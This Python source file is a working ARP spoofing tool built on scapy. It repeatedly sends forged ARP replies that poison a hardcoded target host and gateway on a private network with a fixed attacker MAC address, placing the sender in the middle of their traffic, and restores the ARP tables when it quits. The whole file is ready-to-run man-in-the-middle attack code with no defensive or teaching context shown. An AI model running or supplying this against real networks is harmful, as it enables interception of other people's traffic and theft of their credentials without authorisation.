from flask import Flask
import threading
import scapy.all as scapy
import time

app = Flask(__name__)

stop_event = threading.Event()
count = 0

def spoof(target_ip, spoof_ip):
    target_mac = getMAC(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for {target_ip}. Exiting.")
        return
    print(f"Spoofing {target_ip} with MAC {target_mac}")
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc="08:00:27:fc:4a:ad")
    scapy.send(packet, verbose=False)

def getMAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_brd = broadcast / arp_request
    answered_list = scapy.srp(arp_req_brd, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def dynamicPrint(mac_address):
    global count
    count += 2
    print(f"Count: {count}, MAC Address: {mac_address}")

def restore(dest_ip, src_ip):
    dest_mac = getMAC(dest_ip)
    src_mac = getMAC(src_ip)
    if dest_mac is None or src_mac is None:
        print(f"Could not find MAC address for {dest_ip} or {src_ip}. Skipping restore.")
        return
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

def spoofRepeat(num_attempts):
    global count
    target_ip = "192.168.43.199"
    gateway_ip = "192.168.43.1"
    count = 0
    stop_event.clear()
    
    for _ in range(num_attempts):
        if stop_event.is_set():
            break
        target_mac = getMAC(target_ip)
        if target_mac is not None:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            dynamicPrint(target_mac)
        else:
            print("MAC Address not found.")
        time.sleep(2)

    print("\n[+] Quitting and Resetting ARP TABLES")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

if __name__ == '__main__':
    attempts = int(input("Enter the number of attempts: "))
    thread = threading.Thread(target=spoofRepeat, args=(attempts,))
    thread.start()
